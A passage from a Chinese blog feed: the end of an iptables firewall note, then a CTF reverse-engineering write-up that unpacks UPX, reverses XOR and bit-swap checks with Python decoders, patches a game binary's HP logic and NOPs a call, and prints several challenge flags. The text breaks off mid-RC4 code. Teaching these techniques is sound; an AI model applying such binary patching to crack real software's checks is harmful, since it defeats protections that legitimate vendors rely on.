class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">iptables -A INPUT -p tcp --dport 22 -s 192.168.1.35 -j ACCEPT </div><div class="line">iptables -A INPUT -p tcp --dport 22 -j DROP</div></pre></td></tr></table></figure><h4 id="更改所有来自192-168-1-0-24的数据包的源ip地址为1-2-3-4-nat地址转化"><a href="#更改所有来自192-168-1-0-24的数据包的源ip地址为1-2-3-4-nat地址转化" class="headerlink" title="更改所有来自192.168.1.0/24的数据包的源ip地址为1.2.3.4(nat地址转化)"></a>更改所有来自192.168.1.0/24的数据包的源ip地址为1.2.3.4(nat地址转化)</h4><p><code>iptables -t nat -A POSTROUTING -s 192.168.1.0/24 -o eth0 -j SNAT --to 1.2.3.4</code></p><h4 id="查看的iptables规则"><a href="#查看的iptables规则" class="headerlink" title="查看的iptables规则"></a>查看的iptables规则</h4><p><code>iptables -nL --line-number</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;iptables是linux下的防火墙，得好好学习。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>悄悄的wp</title>
    <link href="http://yoursite.com/2017/12/11/2017_12_11_zjgsctf_re_wp/"/>
    <id>http://yoursite.com/2017/12/11/2017_12_11_zjgsctf_re_wp/</id>
    <published>2017-12-11T08:10:07.106Z</published>
    <updated>2017-12-12T01:21:10.036Z</updated>
    
    <content type="html"><![CDATA[<p>这次比赛，有点坑逆向选手，再次感谢各位宽容大方善良美丽可爱小伙伴们。。。。<br><a id="more"></a></p><h3 id="Re1"><a href="#Re1" class="headerlink" title="Re1"></a>Re1</h3><p>用peid查壳，发现是upx加壳，直接脱壳（ESP定律或者直接找脱壳工具），用IAD打开<br>发现关键函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">__<span class="function">int64 <span class="title">main_0</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> v0; <span class="comment">// edx</span></div><div class="line">  __int64 v1; <span class="comment">// ST00_8</span></div><div class="line">  <span class="keyword">char</span> Buffer; <span class="comment">// [esp+D0h] [ebp-3Ch]</span></div><div class="line"></div><div class="line">  <span class="built_in">puts</span>(<span class="string">"input your Secret:"</span>);</div><div class="line">  gets(&amp;Buffer);</div><div class="line">  <span class="keyword">if</span> ( sub_4110E6((<span class="keyword">int</span>)&amp;unk_417680, &amp;Buffer) )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( sub_41102D(&amp;unk_417680) )</div><div class="line">      <span class="built_in">printf</span>(<span class="string">"flag is flag&#123;%s&#125;\n"</span>, &amp;Buffer);</div><div class="line">    <span class="keyword">else</span></div><div class="line">      <span class="built_in">printf</span>(<span class="string">"you can do it,again\n"</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"sorry\n"</span>);</div><div class="line">  &#125;</div><div class="line">  HIDWORD(v1) = v0;</div><div class="line">  LODWORD(v1) = <span class="number">0</span>;</div><div class="line">  <span class="keyword">return</span> v1;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>发现sub_4110E6功能如下（简单xor），发现key<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_411520</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> *Str)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+DCh] [ebp-8h]</span></div><div class="line"></div><div class="line">  <span class="keyword">if</span> ( j_strlen(Str) != <span class="number">28</span> )</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">28</span>; ++i )</div><div class="line">    *(_BYTE *)(i + a1) = LOBYTE(dword_417000[i]) ^ Str[i];</div><div class="line">  <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>发现sub_41102D函数，如果做过类似题的话，知道这是一个迷宫题目，因为发现正好是上下左右，并且一步都会判断是否出错，因为是+16，判断为宽16<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_4115D0</span><span class="params">(<span class="keyword">int</span> a1)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+D0h] [ebp-20h]</span></div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+E8h] [ebp-8h]</span></div><div class="line"></div><div class="line">  v2 = <span class="string">'&#125;'</span>;</div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">28</span>; ++i )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">switch</span> ( *(_BYTE *)(i + a1) )</div><div class="line">    &#123;</div><div class="line">      <span class="keyword">case</span> <span class="string">'l'</span>:</div><div class="line">        --v2;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">      <span class="keyword">case</span> <span class="string">'r'</span>:</div><div class="line">        ++v2;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">      <span class="keyword">case</span> <span class="string">'f'</span>:</div><div class="line">        v2 += <span class="number">16</span>;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">      <span class="keyword">case</span> <span class="string">'b'</span>:</div><div class="line">        v2 -= <span class="number">16</span>;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> ( byte_417070[v2] == <span class="string">'d'</span> )</div><div class="line">      <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">    <span class="keyword">if</span> ( byte_417070[v2] != <span class="string">'1'</span> )</div><div class="line">      <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>OD加载，发现迷宫，s是开始 ，d是结束，每一步都是1（否则失败），l向左，r向右，f向下，b向上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">0000000000000000</div><div class="line">0   1111111111 0</div><div class="line">0   1        1 0</div><div class="line">0   1        11d</div><div class="line">0   1          0</div><div class="line">0   1111111111 0</div><div class="line">0            1 0</div><div class="line">0000000000000s00</div><div class="line">``</div><div class="line">得到字符串`bblllllllllbbbbrrrrrrrrrffrr`，用python写xor代码得</div><div class="line">``` C</div><div class="line">def Re1_qimo():</div><div class="line">    c = []</div><div class="line">    str = &apos;bblllllllllbbbbrrrrrrrrrffrr&apos;</div><div class="line">    key = [0x2B,0x16,0x33,0x05,0x1F,0x33,0x19,0x1C,0x14,0x33,0x0D,0x0C,0x06,0x3D,0x0F,0x13,0x02,0x2D,0x0B,0x1D,0x07,0x2D,0x19,0x1C,0x56,0x11,0x53,0x53]</div><div class="line">    for i in range(28):</div><div class="line">        c.append(chr(ord(str[i])^key[i]))</div><div class="line">    print &quot;&quot;.join(c)</div></pre></td></tr></table></figure></p><p>flag: It_is_upx_and_map_you_kn0w!!</p><h3 id="Re2"><a href="#Re2" class="headerlink" title="Re2"></a>Re2</h3><p>这里再次对各位小伙伴感到抱歉，我自己没有测试好，导致这题目无解，也感谢小伙伴的宽容。</p><h3 id="Re3"><a href="#Re3" class="headerlink" title="Re3"></a>Re3</h3><p>有ida打开，发现tls,脱去TLS可以参考<a href="https://esebanana.github.io/2017/10/10/re_tls/" target="_blank" rel="external">https://esebanana.github.io/2017/10/10/re_tls/</a><br>发现第一个加密用户名函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">sub_412530</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> k; <span class="comment">// [esp+D0h] [ebp-54h]</span></div><div class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+DCh] [ebp-48h]</span></div><div class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+E8h] [ebp-3Ch]</span></div><div class="line">  __int16 v4[<span class="number">14</span>]; <span class="comment">// [esp+F4h] [ebp-30h]</span></div><div class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+118h] [ebp-Ch]</span></div><div class="line"></div><div class="line">  v5 = j_strlen(&amp;Str);</div><div class="line">  v4[<span class="number">0</span>] = <span class="number">96</span>;</div><div class="line">  v4[<span class="number">1</span>] = <span class="number">113</span>;</div><div class="line">  v4[<span class="number">2</span>] = <span class="number">96</span>;</div><div class="line">  v4[<span class="number">3</span>] = <span class="number">111</span>;</div><div class="line">  v4[<span class="number">4</span>] = <span class="number">127</span>;</div><div class="line">  v4[<span class="number">5</span>] = <span class="number">105</span>;</div><div class="line">  v4[<span class="number">6</span>] = <span class="number">75</span>;</div><div class="line">  v4[<span class="number">7</span>] = <span class="number">85</span>;</div><div class="line">  v4[<span class="number">8</span>] = <span class="number">115</span>;</div><div class="line">  v4[<span class="number">9</span>] = <span class="number">122</span>;</div><div class="line">  v4[<span class="number">10</span>] = <span class="number">74</span>;</div><div class="line">  v4[<span class="number">11</span>] = <span class="number">83</span>;</div><div class="line">  v4[<span class="number">12</span>] = <span class="number">64</span>;</div><div class="line">  v4[<span class="number">13</span>] = <span class="number">81</span>;</div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5 / <span class="number">2</span>; ++i )</div><div class="line">  &#123;</div><div class="line">    *(&amp;Str + i) ^= *(&amp;Str + v5 - <span class="number">1</span> - i);</div><div class="line">    *(&amp;Str + v5 - <span class="number">1</span> - i) ^= *(&amp;Str + i);</div><div class="line">    *(&amp;Str + i) ^= *(&amp;Str + v5 - <span class="number">1</span> - i);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v5; ++j )</div><div class="line">    word_419500[j] = (<span class="keyword">unsigned</span> __int8)(((((j ^ <span class="number">0x76</span>) - <span class="number">18</span>) ^ <span class="number">0x80</span>) + <span class="number">43</span>) ^ *(&amp;Str + j));</div><div class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; v5; ++k )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( word_419500[k] != v4[k] )</div><div class="line">      <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>解密代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">def Re3_qimo():</div><div class="line">    c = []</div><div class="line">    key = [<span class="number">96</span>,<span class="number">113</span>,<span class="number">96</span>,<span class="number">111</span>,<span class="number">127</span>,<span class="number">105</span>,<span class="number">75</span>,<span class="number">85</span>,<span class="number">115</span>,<span class="number">122</span>,<span class="number">74</span>,<span class="number">83</span>,<span class="number">64</span>,<span class="number">81</span>]</div><div class="line">    l=len(key)</div><div class="line">    <span class="keyword">for</span> i in range(l):</div><div class="line">        c.append(chr(key[i]^((((i ^ <span class="number">0x76</span>) - <span class="number">18</span>) ^ <span class="number">0x80</span>) + <span class="number">43</span>)%<span class="number">256</span>))</div><div class="line">    c.reverse()</div><div class="line">    print <span class="string">""</span>.join(c)</div></pre></td></tr></table></figure></p><p>输入flag后、判断flag长度35位，<br>加密一、flag异或得到flag1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">int __cdecl sub_411730(int a1, int a2)</div><div class="line">&#123;</div><div class="line">  int result; // eax</div><div class="line">  signed int i; // [esp+D0h] [ebp-8h]</div><div class="line"></div><div class="line">  for ( i = 0; i &lt; 35; ++i )</div><div class="line">  &#123;</div><div class="line">    *(_BYTE *)(i + a1) = *(_BYTE *)(i + a2) ^ 0x76;</div><div class="line">    result = i + 1;</div><div class="line">  &#125;</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>然后将flag1将中间21个字符分为3组，每一组分别加密<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">#第一组</div><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_411800</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+E8h] [ebp-8h]</span></div><div class="line"></div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">7</span>; ++i )</div><div class="line">  &#123;</div><div class="line">    *(_BYTE *)(i + a1) = *(_BYTE *)(i + a2 + <span class="number">7</span>) ^ <span class="number">0xCC</span>;</div><div class="line">    *(_BYTE *)(i + a1) = <span class="number">2</span> * *(_BYTE *)(i + a1) &amp; <span class="number">0xAA</span> | ((*(_BYTE *)(i + a1) &amp; <span class="number">0xAA</span>) &gt;&gt; <span class="number">1</span>);</div><div class="line">    result = i + <span class="number">1</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div><div class="line">#第二组</div><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_411910</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+E8h] [ebp-8h]</span></div><div class="line"></div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">7</span>; ++i )</div><div class="line">  &#123;</div><div class="line">    *(_BYTE *)(i + a1) = *(_BYTE *)(i + a2 + <span class="number">14</span>) ^ <span class="number">0xBE</span>;</div><div class="line">    *(_BYTE *)(i + a1) = <span class="number">4</span> * *(_BYTE *)(i + a1) &amp; <span class="number">0xCC</span> | ((*(_BYTE *)(i + a1) &amp; <span class="number">0xCC</span>) &gt;&gt; <span class="number">2</span>);</div><div class="line">    result = i + <span class="number">1</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div><div class="line">#第三组</div><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_411A30</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+E8h] [ebp-8h]</span></div><div class="line"></div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">7</span>; ++i )</div><div class="line">  &#123;</div><div class="line">    *(_BYTE *)(i + a1) = *(_BYTE *)(i + a2 + <span class="number">21</span>) ^ <span class="number">0xEF</span>;</div><div class="line">    *(_BYTE *)(i + a1) = <span class="number">16</span> * *(_BYTE *)(i + a1) &amp; <span class="number">0xF0</span> | ((*(_BYTE *)(i + a1) &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>);</div><div class="line">    result = i + <span class="number">1</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>最后和key1比较<br>key1 = [0x10,0x1a ,0x17 ,0x11 ,0xd,0x22 ,0x1e ,0xe3 ,0xc6 ,0xda ,0xe3 ,0xc6 ,0xda ,0xdd ,0xf6 ,0xee ,0x6d ,0xe4 ,0xad ,0xe7 ,0x6d ,0xdf ,0x6f ,0x7f ,0x9a ,0xde ,0x6c ,0xff ,0x13 ,0x17 ,0x4 ,0x29 ,0x57 ,0x57 ,0xb ]</p><p>解密<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">def Re3_qimo():</div><div class="line">    c = []</div><div class="line">    key = [96,113,96,111,127,105,75,85,115,122,74,83,64,81]</div><div class="line">    l=len(key)</div><div class="line">    for i in range(l):</div><div class="line">        c.append(chr(key[i]^((((i ^ 0x76) - 18) ^ 0x80) + 43)%256))</div><div class="line">    c.reverse()</div><div class="line">    print &quot;&quot;.join(c)</div><div class="line"></div><div class="line">    enc_t = [0x10,0x1a ,0x17 ,0x11 ,0xd,0x22 ,0x1e ,0xe3 ,0xc6 ,0xda ,0xe3 ,0xc6 ,0xda ,0xdd ,0xf6 ,0xee ,0x6d ,0xe4 ,0xad ,0xe7 ,0x6d ,0xdf ,0x6f ,0x7f ,0x9a ,0xde ,0x6c ,0xff ,0x13 ,0x17 ,0x4 ,0x29 ,0x57 ,0x57 ,0xb ]</div><div class="line"></div><div class="line">    dec_t = [0]*35</div><div class="line">    #decode1</div><div class="line">    for i in range(7):</div><div class="line">        v1 = (enc_t[i+7] &amp; 0x55) &lt;&lt; 1</div><div class="line">        v2 = (enc_t[i+7] &gt;&gt; 1) &amp; 0x55</div><div class="line">        enc_t[i+7] = v1 | v2</div><div class="line">        enc_t[i+7] = enc_t[i+7] ^ 0xCC</div><div class="line">    #decode2</div><div class="line">    for i in range(7):</div><div class="line">        v1 = (enc_t[i+14] &amp; 0x33) &lt;&lt; 2</div><div class="line">        v2 = (enc_t[i+14] &gt;&gt; 2) &amp; 0x33</div><div class="line">        enc_t[i+14] = v1 | v2</div><div class="line">        enc_t[i+14] = enc_t[i+14] ^ 0xBE</div><div class="line">    #decode3</div><div class="line">    for i in range(7):</div><div class="line">        v1 = (enc_t[i+21] &amp; 0xF) &lt;&lt; 4</div><div class="line">        v2 = (enc_t[i+21] &gt;&gt; 4) &amp; 0xF</div><div class="line">        enc_t[i+21] = v1 | v2</div><div class="line">        enc_t[i+21] = enc_t[i+21] ^ 0xEF</div><div class="line"></div><div class="line">    for i in range(35):</div><div class="line">        dec_t[i] = chr(enc_t[i] ^ 0x76)</div><div class="line"></div><div class="line">    print &quot;&quot;.join(dec_t)</div></pre></td></tr></table></figure></p><h3 id="Re4"><a href="#Re4" class="headerlink" title="Re4"></a>Re4</h3><p>IDA打开找到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">int __thiscall muen_412200(void *this)</div><div class="line">&#123;</div><div class="line">  int result; // eax</div><div class="line">  void *v2; // ecx</div><div class="line">  void *v3; // ecx</div><div class="line">  void *v4; // ecx</div><div class="line"></div><div class="line">  LOBYTE(result) = sub_411163(this);</div><div class="line">  dword_4182DC = (char)result;</div><div class="line">  result = (char)result;</div><div class="line">  switch ( (char)result )</div><div class="line">  &#123;</div><div class="line">    case 0:</div><div class="line">      system(&quot;cls&quot;);</div><div class="line">      result = j_muen_412200(v2);</div><div class="line">      break;</div><div class="line">    case 1:</div><div class="line">      j_atk_subkkkkkkkkkkkkkkkkkkkkkk_412010();</div><div class="line">      system(&quot;cls&quot;);</div><div class="line">      result = j_muen_412200(v3);</div><div class="line">      break;</div><div class="line">    case 2:</div><div class="line">      deffffffffffffffffffffff_41111D();</div><div class="line">      system(&quot;cls&quot;);</div><div class="line">      result = j_muen_412200(v4);</div><div class="line">      break;</div><div class="line">    case 3:</div><div class="line">      deah_411113();</div><div class="line">      return result;</div><div class="line">    default:</div><div class="line">      return result;</div><div class="line">  &#125;</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>找到攻击函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">int sub_412010()</div><div class="line">&#123;</div><div class="line">  int result; // eax</div><div class="line"></div><div class="line">  if ( hp &gt; 0 )</div><div class="line">  &#123;</div><div class="line">    hp -= boss_atk;</div><div class="line">    result = boss_hp - atk;</div><div class="line">    boss_hp -= atk;</div><div class="line">  &#125;</div><div class="line">  if ( hp &lt;= 0 )</div><div class="line">  &#123;</div><div class="line">    printf(&quot;you are die!!\n&quot;);</div><div class="line">    exit(0);</div><div class="line">  &#125;</div><div class="line">  if ( boss_hp &lt;= 0 )</div><div class="line">    result = sub_41100F();</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>改为,这样自己不会掉血<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">int subkkkkkkkkkkkkkkkkkkkkkk_412010()</div><div class="line">&#123;</div><div class="line">  int result; // eax</div><div class="line"></div><div class="line">  if ( hp &gt; 0 )</div><div class="line">  &#123;</div><div class="line">    result = boss_hp - atk;</div><div class="line">    boss_hp -= atk;</div><div class="line">  &#125;</div><div class="line">  if ( hp &lt;= 0 )</div><div class="line">  &#123;</div><div class="line">    printf(&quot;you are die!!\n&quot;);</div><div class="line">    exit(0);</div><div class="line">  &#125;</div><div class="line">  if ( boss_hp &lt;= 0 )</div><div class="line">    result = next_boss_sub_41100F();</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>然后，慢慢，把每一层都修改，最后一层因为调用自杀函数，这里直接nop掉，最后修改保存，得到flag<br>flag : flag{I_1ike_hard_w0rk_484_RE_and_never_up}</p><h3 id="apk1"><a href="#apk1" class="headerlink" title="apk1"></a>apk1</h3><p>用工具apk_to_java.jar打开，发现是一个re4加密<br>放在java里运行<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">encode</span><span class="params">(String aInput, String aKey)</span> </span>&#123;</div><div class="line">        <span class="keyword">int</span> i;</div><div class="line">        <span class="keyword">int</span>[] iS = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">256</span>];</div><div class="line">        <span class="keyword">byte</span>[] iK = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">256</span>];</div><div class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</div><div class="line">            iS[i] = i;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">short</span> i2 = (<span class="keyword">short</span>) <span class="number">0</span>; i2 &lt; (<span class="keyword">short</span>) <span class="number">256</span>; i2 = (<span class="keyword">short</span>) (i2 + <span class="number">1</span>)) &#123;</div><div class="line">            iK[i2] = (<span class="keyword">byte</span>) aKey.charAt(i2 % aKey.length());</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">int</span> j = <span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">255</span>; i++) &#123;</div><div class="line">            j = ((iS[i] + j) + iK[i]) % <span class="number">256</span>;</div><div class="line">            <span class="keyword">int</span> temp = iS[i];</div><div class="line">            iS[i] = iS[j];</div><div class="line">            iS[j] = temp;</div><div class="line">        &#125;</div><div class="line">        i = <span class="number">0</span>;</div><div class="line">        j = <span class="number">0</span>;</div><div class="line">        <span class="keyword">int</span> temp;</div><div class="line">        <span class="keyword">char</span>[] iInputChar = aInput.toCharArray();</div><div class="line">        <span class="keyword">char</span>[] iOutputChar = <span class="keyword">new</span> <span class="keyword">char</span>[iInputChar.length];</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">short</span> x = (<span class="keyword">short</span>) <span class="number">0</span>; x &lt; iInputChar.length; x = (<span class="keyword">short</span>) (x + <span class="number">1</span>)) &#123;</div><div class="line">            i = (i + <span class="number">1</span>) % <span class="number">256</span>;</div><div class="line">            j = (iS[i] + j) % 